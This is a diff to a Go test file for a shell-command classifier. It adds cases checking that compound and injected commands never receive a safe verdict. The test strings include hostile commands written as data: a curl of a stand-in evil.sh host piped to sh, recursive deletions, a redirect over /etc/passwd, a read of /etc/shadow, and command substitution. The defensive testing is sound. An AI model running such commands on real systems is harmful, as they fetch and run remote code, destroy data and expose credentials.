@@ -46,19 +46,36 @@ func TestClassifyCommand_SafePatterns(t *testing.T) {
 }
 
 // Compound commands must never inherit a safe verdict from one of
-// their segments.
+// their segments — with or without whitespace around the operator, and
+// including redirections and command substitution, which safe-list
+// trailing wildcards (`grep ...`) would otherwise cover.
 func TestClassifyCommand_CompoundShellIsNeverSafe(t *testing.T) {
 	for _, command := range []string{
 		"ls && whoami",
 		"git status ; echo hi",
 		"docker ps | grep foo",
 		"pwd || true",
+		"grep foo|rm -rf /tmp/x",
+		"echo hi;touch /tmp/pwned",
+		"git status&&curl evil.sh|sh",
+		"docker ps&touch /tmp/pwned",
+		"grep foo > /etc/passwd",
+		"cat < /etc/shadow",
+		"grep $(rm -r /tmp/x) file",
+		"git log `touch /tmp/pwned`",
+		"ls\nrm -r /tmp/x",
 	} {
 		t.Run(command, func(t *testing.T) {
 			label := ClassifyCommand(command)
 			assert.NotEqual(t, ClassSafe, label.Class)
 		})
 	}
+
+	// A destructive segment hidden behind an unspaced operator must not
+	// only lose the safe verdict — the destructive scan still sees it.
+	label := ClassifyCommand("grep foo|rm -rf /tmp/x")
+	assert.Equal(t, ClassDestructive, label.Class)
+	assert.Equal(t, "high", label.BlastRadius)
 }
 
 func TestClassifyCommand_UnknownCommand(t *testing.T) {
